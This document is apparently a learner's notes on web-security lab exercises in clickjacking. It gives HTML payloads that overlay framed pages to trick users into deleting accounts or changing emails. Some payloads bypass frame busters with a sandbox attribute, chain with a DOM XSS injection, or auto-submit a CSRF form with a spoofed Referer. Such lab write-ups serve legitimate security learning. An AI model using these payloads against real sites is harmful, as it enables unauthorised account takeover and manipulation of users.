# Basic Clickjacking with CSRF token protection
- We basically have to create a copy of the website we intend to attack. 
- In this lab, the user clicked on anything that was labeled 'click'. 
```HTML
<style>
    iframe {
        position:relative;
        width: $iframe_width;
        height: $iframe_height;
        opacity: 1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: $top_value;
        left: $left_value;
        z-index: 1;
    }
</style>
<div>Click here</div>
<iframe src="https://ac2a1f7d1e2eebbac0bb0b3d00fa0068.web-security-academy.net"></iframe>
```
- In this lab I had to trick the user into deleting his/her account, for that I had to create the iframe and position the `<div>` element so that my "Click Me" div is positioned right on top of the 'Delete Account' button.
# Basic Clickjacking with pre-filled input fields
- In this lab I had to trick a user into updating his/her email, it was pretty much the same as the previous one, except I had to prefill the input field for email by appending `?email=myrandom@email.com` to the url as often that sets the form parameter.
```HTML
<style>
iframe {
    position: relative;
    width: 900px; 
    height: 1000px;
    opacity: 0.5; 
    z-index: 2;
}
button {
    position: absolute; 
    top: 450px; 
    left: 80px;
    z-index: 1;
}
</style>
<form method="POST" action="https://ac6f1fed1eacaca3c0e40ca0004900b6.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="something@email.net">
    <button type="submit">Click me</button>
</form>
<iframe src="https://ac6f1fed1eacaca3c0e40ca0004900b6.web-security-academy.net/my-account?email=test@test.com"></iframe>
```
## Clickjacking but iframe is blocked using frame buster scripts
- An effective attacker workaround against frame busters is to use the HTML5 iframe `sandbox` attribute. When this is set with the `allow-forms` or `allow-scripts` values and the `allow-top-navigation` value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:

```HTML
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```
- adding this one `sandbox` attribute to the previous HTML payload worked!
## Clickjacking coupled with DOM XSS
- Find out where the DOM XSS exploit is, pre-fill the form and then use the same payload to exploit that XSS vulnerability 
```HTML
<style>
iframe {
    position: relative;
    width: 900px; 
    height: 1000px;
    opacity: 0.5; 
    z-index: 2;
}
button {
    position: absolute; 
    top: 790px; 
    left: 80px;
    z-index: 1;
}
</style>
<button type="submit">Click me</button>
<iframe src="https://ac7a1f991eb12f75c0d0b97900c1003d.web-security-academy.net/feedback?name=<img src=x onerror=print()>&email=email@email.com&subject=random&message=message"></iframe>
```
## Multistep Clickjacking
- This one is the same as the basic clickjacking except I had to position multiple buttons instead of one.
```HTML
<style>
iframe {
    position: relative;
    width: 900px; 
    height: 1000px;
    opacity: 0.5; 
    z-index: 2;
}
.first, .second {
    position: absolute; 
    top: 500px; 
    left: 80px;
    z-index: 1;
}
.second {
    top: 300px; 
    left: 250px;
}
</style>
<button class="first" type="submit">Click me first</button>
<button class="second" type="submit">Click me next</button>
<iframe src="https://ac161fd51e181745c02515da000b00aa.web-security-academy.net/my-account"></iframe>
```
## Clickjacking - CSRF with Broken referer validation
```HTML
history.pushState("", "", "/target-website.com")
```
- history.pushState pushes a history entry in the browser and the `target-url` (/target-website.com) is set as the `Referer` of the request 
- add a header 'Referrer-Policy: unsafe-url' if the response is 'Invalid Referer Header'
- The payload:
```HTML
<script>history.pushState("", "", "/?validated-domain.com")</script>
<form method="POST" action="https://target-url.com/endpoint">
	<input type="hidden" name="email" value="email@email.com">
	<input type="submit" name="Submit Request">
</form>
<script>
	document.forms[0].submit();
</script>
```